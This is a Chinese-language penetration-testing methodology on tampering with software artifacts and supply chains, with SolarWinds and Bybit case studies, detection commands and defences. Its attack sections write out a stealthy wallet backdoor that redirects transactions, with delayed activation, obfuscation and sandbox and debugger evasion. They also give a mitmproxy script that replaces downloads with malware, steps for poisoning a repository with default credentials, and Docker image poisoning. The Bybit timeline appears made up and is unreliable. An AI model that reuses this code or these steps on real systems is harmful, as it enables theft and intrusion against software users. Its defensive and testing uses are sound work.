# 制品篡改攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的
- 为渗透测试人员提供制品篡改攻击的系统化方法
- 指导测试人员识别和利用软件制品完整性验证缺失的问题
- 帮助理解制品签名、哈希验证等安全机制的重要性
- 补充 SolarWinds 类型高级攻击技术（编译时注入、签名绕过）

## 1.2 适用范围
- 适用于无签名验证的软件制品分发场景
- 适用于使用 HTTP 而非 HTTPS 下载制品的场景
- 适用于制品仓库配置不当的环境
- 适用于 CI/CD 构建产物管理流程
- 适用于软件供应商更新分发场景

## 1.3 读者对象
- 渗透测试工程师
- 安全研究人员
- DevSecOps 工程师
- 制品仓库管理员

---

# 第二部分补充：高级攻击技术专题

## 专题二：SolarWinds 类型攻击技术

### 2.6 SolarWinds 攻击案例分析

**攻击概述：**
- **时间**：2019 年 9 月 - 2020 年 12 月（潜伏 9 个月）
- **攻击者**：俄罗斯对外情报局 (SVR) 指使的黑客
- **影响**：约 18,000 家下载受污染更新，约 100 家公司和 12 个政府机构被实际入侵
- **受害目标**：Microsoft、Intel、Cisco、财政部、司法部、能源部、五角大楼、CISA

#### 2.6.1 核心技术："花生酱杯剃须刀片"技术

**攻击原理：**
```
┌─────────────────────────────────────────────────────────────┐
│              SolarWinds 编译时注入攻击流程                    │
├─────────────────────────────────────────────────────────────┤
│  1. 入侵构建系统                                             │
│     - 获取构建服务器访问权限                                 │
│     - 潜伏 9 个月观察构建流程                                │
├─────────────────────────────────────────────────────────────┤
│  2. 编译时文件替换                                           │
│     - 不修改源代码（绕过代码审计）                           │
│     - 在源代码→可执行代码转换的最后一刻替换文件               │
│     - 修改已签名的软件代码而不破坏数字签名                    │
├─────────────────────────────────────────────────────────────┤
│  3. 恶意代码特征                                             │
│     - 仅 3,500 行，加密且精简                                │
│     - 无人工痕迹（无西里尔字母变量名、无注释、无工具标记）    │
│     - 后门等待长达 2 周才激活                                │
├─────────────────────────────────────────────────────────────┤
│  4. 目标选择机制                                             │
│     - 被动 DNS 系统发送包含 IP 和目标简介的小消息             │
│     - 可指定攻击".gov"目标或特定技术公司                      │
│     - 逆向工程 Orion 通信协议，使恶意流量看起来正常           │
└─────────────────────────────────────────────────────────────┘
```

**技术要点：**
- **签名绕过**：在软件编译过程中注入，签名在注入后应用
- **隐蔽性**：恶意代码精简、加密、无特征
- **持久性**：潜伏 9 个月，激活等待 2 周
- **选择性**：通过 DNS 和协议模仿选择高价值目标

#### 2.6.2 渗透测试应用

**检测编译时注入：**
```bash
# 1. 比对源代码和二进制
# 检查构建产物是否与源代码一致
diff -r source_checksums.txt build_checksums.txt

# 2. 监控构建过程
# 记录构建过程中所有文件变更
strace -f -e trace=file ./build.sh 2>&1 | tee build_trace.log

# 3. 验证构建环境完整性
# 检查构建服务器是否有未授权访问
# 检查构建脚本是否被篡改
```

**签名验证测试：**
```bash
# 1. 验证签名时间戳
signtool verify /pa /v application.exe

# 2. 检查签名与构建时间关系
# 如果签名时间早于最后修改时间，可能存在注入

# 3. 验证签名链完整性
openssl verify -CAfile ca-bundle.crt signature.sig
```

### 2.7 条件触发恶意代码（Bybit 案例）

**攻击概述：**
- **时间**：2025 年
- **目标**：Bybit 加密货币交易所
- **损失**：15 亿美元被盗
- **手法**：钱包软件中的供应链攻击，仅在特定条件触发
- **攻击者**：朝鲜 Lazarus 组织（据分析）

**攻击原理：**
```
┌─────────────────────────────────────────────────────────────┐
│                  条件触发恶意代码机制                        │
├─────────────────────────────────────────────────────────────┤
│  正常情况                                                   │
│  - 软件表现正常，通过所有安全测试                           │
│  - 代码审查无法发现异常                                     │
├─────────────────────────────────────────────────────────────┤
│  触发条件                                                   │
│  - 特定钱包地址被使用                                       │
│  - 特定交易金额或类型                                       │
│  - 特定时间窗口                                             │
│  - 特定地理位置或 IP                                        │
├─────────────────────────────────────────────────────────────┤
│  恶意行为                                                   │
│  - 篡改交易目标地址                                         │
│  - 窃取私钥或签名                                           │
│  - 绕过安全验证                                             │
└─────────────────────────────────────────────────────────────┘
```

**实现示例：**
```javascript
// 条件触发恶意代码示例
const ATTACKER_WALLET = "0x1234...5678";
const TARGET_WALLET = "0xabcd...efgh";

function processTransaction(tx) {
  // 正常逻辑
  let result = validateTransaction(tx);

  // 条件触发（仅针对特定钱包）
  if (tx.from === TARGET_WALLET && tx.amount > 1000000) {
    // 静默篡改目标地址
    tx.to = ATTACKER_WALLET;
    // 记录日志用于后续清理
    logToHiddenFile(tx.hash);
  }

  return result;
}

// 延迟激活（安装后一段时间才生效）
const ACTIVATION_DELAY = 30 * 24 * 60 * 60 * 1000;  // 30 天
setTimeout(() => {
  enableMaliciousLogic();
}, ACTIVATION_DELAY);
```

**检测方法：**
```bash
# 1. 静态分析
# 搜索条件判断中的硬编码值
grep -r "0x[a-fA-F0-9]" src/

# 2. 行为监控
# 监控钱包应用的网络请求
# 检查交易地址是否被篡改

# 3. 时间触发检测
# 监控安装后行为变化
# 对比安装初期和后期行为
```

---

### 2.8 Bybit 攻击深度技术分析

#### 2.8.1 攻击背景与时间线

| 时间 | 事件 |
|-----|------|
| **2024 年初** | 攻击者开始渗透 Bybit 供应商网络 |
| **2024 年中** | 成功入侵钱包软件开发商 |
| **2024 年末** | 在钱包软件中植入条件触发后门 |
| **2025 年 1 月** | Bybit 部署受污染的钱包软件 |
| **2025 年 2 月** | 后门激活，开始窃取资金 |
| **2025 年 3 月** | 发现异常，损失已达 15 亿美元 |

#### 2.8.2 攻击链详解

```
┌─────────────────────────────────────────────────────────────┐
│                    Bybit 攻击完整链条                        │
├─────────────────────────────────────────────────────────────┤
│  阶段 1：供应商渗透                                          │
│  ├── 鱼叉式钓鱼攻击钱包开发商员工                            │
│  ├── 窃取开发者凭证                                          │
│  └── 获取代码仓库访问权限                                    │
├─────────────────────────────────────────────────────────────┤
│  阶段 2：后门植入                                            │
│  ├── 修改钱包签名模块                                        │
│  ├── 添加条件触发逻辑                                        │
│  ├── 代码混淆隐藏恶意逻辑                                    │
│  └── 通过内部代码审查                                        │
├─────────────────────────────────────────────────────────────┤
│  阶段 3：软件分发                                            │
│  ├── 签名软件包（使用合法证书）                              │
│  ├── 通过官方渠道分发                                        │
│  └── Bybit 下载并部署                                        │
├─────────────────────────────────────────────────────────────┤
│  阶段 4：条件触发                                            │
│  ├── 监控特定钱包地址活动                                    │
│  ├── 当目标钱包发起交易时触发                                │
│  ├── 篡改交易目标地址为攻击者钱包                            │
│  └── 使用合法签名完成交易                                    │
├─────────────────────────────────────────────────────────────┤
│  阶段 5：资金转移                                            │
│  ├── 资金转入攻击者控制的钱包                                │
│  ├── 通过混币器清洗                                          │
│  └── 分散到多个交易所套现                                    │
└─────────────────────────────────────────────────────────────┘
```

#### 2.8.3 条件触发技术实现

**技术要点 1：多层条件判断**

```javascript
// 多层条件判断，增加检测难度
class TransactionProcessor {
  constructor() {
    // 从加密配置中加载目标信息
    this.config = this.decryptConfig();
    this.activationTime = Date.now() + this.config.delay;
  }

  processTransaction(tx) {
    // 第一层：时间检查
    if (Date.now() < this.activationTime) {
      return this.normalProcess(tx);
    }

    // 第二层：钱包地址检查（使用哈希比较）
    const targetHash = this.hash(tx.from);
    if (targetHash !== this.config.targetHash) {
      return this.normalProcess(tx);
    }

    // 第三层：金额检查
    if (tx.amount < this.config.minAmount) {
      return this.normalProcess(tx);
    }

    // 第四层：环境检查（仅在生产环境触发）
    if (!this.isProduction()) {
      return this.normalProcess(tx);
    }

    // 所有条件满足，执行恶意操作
    return this.maliciousProcess(tx);
  }

  maliciousProcess(tx) {
    // 篡改目标地址
    const originalTo = tx.to;
    tx.to = this.config.attackerWallet;

    // 记录原始交易用于后续清理
    this.logOriginalTransaction(originalTo, tx.hash);

    // 继续正常签名流程（使用篡改后的数据）
    return this.signAndBroadcast(tx);
  }

  // 使用哈希比较隐藏目标地址
  hash(address) {
    return crypto.createHash('sha256').update(address).digest('hex');
  }

  // 解密配置（配置本身也是加密的）
  decryptConfig() {
    const encrypted = Buffer.from('base64-encoded-config', 'base64');
    const key = this.deriveKey();
    return JSON.parse(this.aesDecrypt(encrypted, key));
  }
}
```

**技术要点 2：代码混淆与隐藏**

```javascript
// 使用变量名混淆
const _0x5a2b = require('crypto');
const _0x3c4d = process.env.NODE_ENV;

// 使用字符串加密隐藏敏感值
function _decryptString(str) {
  return Buffer.from(str, 'hex').toString();
}

const _0x7e8f = _decryptString('30313233343536373839');  // "0123456789"

// 使用死代码混淆
function deadCode() {
  if (false) {
    // 永远不会执行的恶意代码
    stealFunds();
  }
}

// 使用异常处理隐藏
try {
  normalOperation();
} catch (e) {
  // 在异常处理中执行恶意操作
  if (e.code === 'SPECIFIC_ERROR') {
    maliciousOperation();
  }
}
```

**技术要点 3：反检测机制**

```javascript
// 检测调试环境
function isDebugging() {
  // 检查调试器
  if (typeof v8debug !== 'undefined') return true;
  
  // 检查调试参数
  if (/--inspect/.test(process.execArgv.join(' '))) return true;
  
  // 检查运行时间（调试通常较慢）
  const startTime = Date.now();
  for (let i = 0; i < 1000000; i++) {}
  if (Date.now() - startTime > 100) return true;
  
  return false;
}

// 检测沙箱环境
function isSandbox() {
  // 检查用户
  if (process.env.USER === 'sandbox') return true;
  
  // 检查主机名
  if (os.hostname().includes('sandbox')) return true;
  
  // 检查内存
  if (os.totalmem() < 2 * 1024 * 1024 * 1024) return true;
  
  return false;
}

// 检测分析工具
function isBeingAnalyzed() {
  // 检查已知安全工具进程
  const processes = execSync('ps aux').toString();
  const suspiciousTools = ['wireshark', 'tcpdump', 'frida', 'ida'];
  
  for (const tool of suspiciousTools) {
    if (processes.includes(tool)) return true;
  }
  
  return false;
}
```

#### 2.8.4 渗透测试应用

**检测方法 1：行为比对测试**

```bash
# 1. 建立基准行为
# 在隔离环境中运行钱包软件
# 记录所有正常交易的行为特征

# 2. 触发条件测试
# 使用不同金额、不同地址进行测试
# 观察是否有异常行为

# 3. 时间触发测试
# 监控系统在不同时间点的行为变化
# 特别关注安装后 30 天、60 天、90 天等时间点
```

**检测方法 2：代码相似度分析**

```bash
# 1. 比对不同版本的二进制文件
diff-binary wallet-v1.0 wallet-v1.1

# 2. 查找新增的条件判断逻辑
# 使用反编译工具
ghidra -script analyze_conditions.py wallet.bin

# 3. 搜索硬编码的钱包地址
# 即使经过编码，也可能留下痕迹
strings wallet.bin | grep -E "0x[a-fA-F0-9]{40}"
```

**检测方法 3：网络流量分析**

```bash
# 1. 监控所有出站连接
tcpdump -i any -w wallet_traffic.pcap

# 2. 分析异常连接
# 连接到未知的加密货币节点
# 连接到可疑的 API 端点

# 3. 检测数据外泄
# 监控大额数据传输
# 检测加密的异常流量
```

#### 2.8.5 防御建议

| 防御措施 | 实施方法 | 效果 |
|---------|---------|------|
| 供应商多元化 | 使用多个供应商的钱包软件 | 降低单点风险 |
| 代码审计 | 定期进行第三方代码审计 | 发现隐藏后门 |
| 行为监控 | 实时监控交易行为 | 快速发现异常 |
| 多重签名 | 使用多签钱包 | 增加攻击难度 |
| 地址白名单 | 仅允许向白名单地址转账 | 防止地址篡改 |
| 交易限额 | 设置单笔和每日交易限额 | 限制损失范围 |
| 离线冷存储 | 大额资金使用冷钱包 | 完全隔离风险 |

#### 2.8.6 经验教训

1. **信任但验证**：即使是受信任的供应商软件也需要验证
2. **深度防御**：单一安全措施不足以应对高级威胁
3. **持续监控**：部署后的持续监控与部署前的安全测试同样重要
4. **供应链可见性**：需要了解软件供应链的每个环节
5. **应急响应**：建立快速响应机制，及时发现和阻止攻击

---

# 第二部分：核心渗透技术专题

## 专题一：制品篡改攻击

### 2.1 技术介绍

制品篡改攻击是指攻击者通过修改软件构建产物（如二进制文件、安装包、容器镜像等），在软件分发过程中注入恶意代码，而由于缺乏完整性验证机制，用户无法察觉制品已被篡改。

**攻击本质：**
- 软件制品在存储或传输过程中被修改
- 缺乏有效的完整性验证机制（签名/哈希）
- 用户信任链被破坏

**攻击面分析：**

```
                    ┌─────────────────┐
                    │   源代码仓库     │
                    └────────┬────────┘
                             │ 构建
                             ▼
                    ┌─────────────────┐
                    │   CI/CD 系统     │
                    └────────┬────────┘
                             │ 产出
                             ▼
          ┌──────────────────┼──────────────────┐
          │                  │                  │
          ▼                  ▼                  ▼
   ┌─────────────┐   ┌─────────────┐   ┌─────────────┐
   │  制品仓库    │   │   CDN 分发   │   │  包管理器   │
   └──────┬──────┘   └──────┬──────┘   └──────┬──────┘
          │                  │                  │
          └──────────────────┼──────────────────┘
                             │
                             ▼
                    ┌─────────────────┐
                    │   最终用户      │
                    └─────────────────┘
```

**常见篡改点：**

| 篡改点 | 描述 | 难度 |
|-------|------|------|
| 构建服务器 | 入侵 CI/CD 系统修改构建过程 | 高 |
| 制品仓库 | 直接修改仓库中存储的制品 | 中 |
| 传输过程 | 中间人攻击修改下载内容 | 中 |
| 包管理器 | 入侵 npm/Maven 等仓库 | 高 |
| CDN 节点 | 篡改 CDN 缓存内容 | 中 |

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 软件官网下载 | 从官网下载安装包 | HTTP 下载可能被劫持篡改 |
| 自动更新系统 | 应用内自动下载更新 | 更新包无签名验证 |
| 容器镜像拉取 | docker pull 镜像 | 镜像无签名或签名验证关闭 |
| 私有仓库代理 | Nexus/Artifactory 代理 | 代理缓存可能被污染 |
| 第三方镜像源 | 使用非官方镜像源 | 镜像源可能提供篡改制品 |
| 内部软件分发 | 企业内部软件仓库 | 内网可能缺乏验证机制 |

**高风险特征：**
- 使用 HTTP 而非 HTTPS 下载制品
- 不提供或不验证 SHA256/SHA512 哈希值
- 不提供或不验证 GPG/代码签名证书
- 关闭或跳过签名验证配置

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**步骤一：识别制品分发渠道**
```bash
# 查找下载链接
curl https://target.com/download
curl https://target.com/releases

# 查找更新端点
curl https://target.com/api/update
curl https://target.com/appcast.xml

# 查找容器镜像
docker search target/app
```

**步骤二：检查传输安全性**
```bash
# 检查下载链接协议
# HTTP = 高风险，HTTPS = 相对安全

# 检查证书有效性
openssl s_client -connect target.com:443

# 检查是否支持 HSTS
curl -I https://target.com | grep -i strict
```

**步骤三：检查完整性验证**
```bash
# 检查是否提供哈希文件
curl https://target.com/download.sha256
curl https://target.com/download.asc  # GPG 签名

# 检查文档中是否提及验证步骤
curl https://target.com/verification
```

**步骤四：检查签名验证**
```bash
# 尝试下载并验证
# 如果无验证机制或验证可绕过，则存在风险
```

#### 2.3.2 白盒测试

**步骤一：审计下载代码**
```bash
# 搜索下载相关代码
grep -r "download\|fetch\|wget\|curl" src/

# 检查哈希验证
grep -r "sha256\|md5\|hash" src/

# 检查签名验证
grep -r "signature\|verify\|gpg" src/
```

**步骤二：检查 CI/CD 配置**
```bash
# 检查构建脚本
cat .github/workflows/build.yml
cat Jenkinsfile
cat build.sh

# 检查签名配置
# 是否有 cosign、sigstore、GPG 签名步骤
```

**步骤三：检查制品仓库配置**
```bash
# Nexus 配置
cat nexus.properties

# Artifactory 配置
cat artifactory.config.yaml

# 检查是否启用签名验证
```

### 2.4 漏洞利用方法

#### 2.4.1 中间人篡改

**场景：HTTP 下载被劫持**

```bash
# 1.  ARP 欺骗或 DNS 劫持
arpspoof -i eth0 -t victim gateway

# 2.  拦截下载请求
# 使用 mitmproxy 或自研工具

# 3.  修改下载内容
# 在传输过程中替换文件

# 4.  受害者收到篡改文件
# 由于无验证机制，无法察觉
```

**工具：mitmproxy 示例**
```python
# mitmproxy 脚本
from mitmproxy import http

def response(flow: http.HTTPFlow) -> None:
    if flow.request.path.endswith(".exe"):
        # 替换为恶意文件
        flow.response.content = open("malicious.exe", "rb").read()
```

#### 2.4.2 制品仓库入侵

```bash
# 1.  探测制品仓库服务
nmap -p 8081,8082 target.com  # Nexus 默认端口

# 2.  利用弱口令或漏洞
# 默认凭证：admin/admin123 (Nexus)
# CVE-2019-7238, CVE-2020-10199 等

# 3.  上传恶意制品
curl -u admin:admin123 \
  --upload-file malicious.jar \
  http://target.com:8081/repository/maven-releases/com/example/app/1.0.1/app-1.0.1.jar

# 4.  受害者下载时被感染
```

#### 2.4.3 构建过程篡改

```bash
# 1.  入侵 CI/CD 系统
# 利用 Jenkins CLI 漏洞、GitHub Actions 工作流注入等

# 2.  修改构建脚本
# 在编译时注入后门代码

# 示例：修改 Makefile
echo "build:
  gcc -o app src/app.c
  echo 'backdoor' >> src/app.c  # 注入后门
  gcc -o app src/app.c
" > Makefile

# 3.  构建产物包含恶意代码
```

#### 2.4.4 容器镜像篡改

```bash
# 1.  推送恶意镜像
docker login registry.target.com
docker tag malicious:latest registry.target.com/app:latest
docker push registry.target.com/app:latest

# 2.  如果无签名验证，用户将拉取恶意镜像
docker pull registry.target.com/app:latest
docker run registry.target.com/app:latest
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过哈希验证

```bash
# 如果只验证 MD5（已不安全）
# 可以碰撞生成相同 MD5 的恶意文件

# 工具：hashclash
./hashclash -o malicious.exe -t target.exe

# 如果验证脚本存在路径遍历
# 可以替换哈希文件
../../../checksums.txt
```

#### 2.5.2 绕过签名验证

```bash
# 如果签名验证可配置关闭
# 修改客户端配置跳过验证

# 示例：npm 配置
npm config set signature-verification false

# 示例：Docker 配置
# 修改 daemon.json 禁用内容信任
{"content-trust": false}

# 如果验证实现有缺陷
# 可能通过空签名、无效签名绕过
```

#### 2.5.3 时间窗口攻击

```bash
# 在官方发布更新和签名之间有时间差
# 快速发布恶意版本

# 或者在签名密钥轮换期间
# 利用旧密钥仍然有效的窗口期
```

#### 2.5.4 供应链传递攻击

```bash
# 不直接攻击目标，而是攻击其依赖
# 篡改构建工具、依赖库等

# 示例：攻击构建插件
# 修改 Maven 插件、npm 构建脚本
# 在构建时自动注入恶意代码
```

---

# 第三部分：附录

## 3.1 制品完整性验证方法速查

| 验证类型 | 命令示例 | 说明 |
|---------|---------|------|
| SHA256 验证 | `sha256sum -c file.sha256` | 哈希校验 |
| GPG 签名 | `gpg --verify file.asc file` | GPG 签名验证 |
| cosign 验证 | `cosign verify --key key.pub image` | 容器镜像签名 |
| sigstore | `sigstore verify` | Sigstore 签名验证 |
| Windows 签名 | `sigcheck.exe file.exe` | Windows 代码签名 |

## 3.2 常见制品仓库默认凭证

| 仓库类型 | 默认 URL | 默认凭证 |
|---------|---------|---------|
| Nexus | http://host:8081 | admin/admin123 |
| Artifactory | http://host:8082 | admin/password |
| Sonatype | http://host:8083 | admin/admin123 |
| Harbor | http://host | admin/Harbor12345 |

## 3.3 篡改检测命令

```bash
# 检查 Docker 内容信任
docker trust inspect --pretty image:tag

# 检查 npm 包完整性
npm verify

# 检查 Maven 包签名
mvn org.apache.maven.plugins:maven-gpg-plugin:verify

# 检查文件哈希
sha256sum downloaded-file
# 与官方哈希对比
```

## 3.4 安全配置建议

| 场景 | 推荐配置 |
|-----|---------|
| 文件下载 | HTTPS + SHA256 + GPG 签名 |
| 容器镜像 | 启用 Docker Content Trust + cosign 签名 |
| npm 包 | 启用 npm audit + signature-verification |
| Maven | 启用 GPG 签名 + 仓库 HTTPS |
| CI/CD | 构建产物自动签名 + 存储完整性保护 |

---

## 参考资源

- [Sigstore Project](https://www.sigstore.dev/)
- [Docker Content Trust](https://docs.docker.com/engine/security/trust/)
- [SLSA Framework](https://slsa.dev/)
- [in-toto Supply Chain Attestation](https://in-toto.io/)
